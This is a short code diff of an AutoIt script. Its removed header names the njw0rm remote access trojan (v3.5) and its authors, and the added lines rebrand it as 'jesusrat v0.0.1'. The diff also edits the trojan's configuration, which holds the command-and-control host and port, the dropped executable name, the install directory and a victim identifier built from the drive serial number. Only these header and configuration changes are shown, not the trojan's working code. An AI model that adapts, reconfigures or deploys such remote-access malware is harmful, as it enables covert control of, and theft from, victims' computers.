@@ -1,9 +1,6 @@
 #comments-start
 
-njw0rm  : v3.5
-Write By: njq8 + Mr.Mobark
-T = @njq8 + F = HK Dark
-Last Update: 2013/7/10
+jesusrat  :v0.0.1
 
 #comments-end
 
@@ -23,12 +20,12 @@ Last Update: 2013/7/10
 
 Opt("RunErrorsFatal", 0)
 
-Local $Host =  "<host>"
-Local $PORT = <port>
-Local $EXE  = "<exe>"
+Local $HOST =  "PROXY/24"
+Local $PORT = "0000"
+Local $EXE  = "bin\\ \.. *.exe"
 Local $DIR  = EnvGet("<dir>") & "\"
-Local $VR  = "3.5"
-Local $name  =  "<name>"
+Local $VR  = "0.0.1"
+Local $name  =  "jesusrat"
 
 $name &=   "_" & Hex( driveGetSerial( @HomeDrive))
 
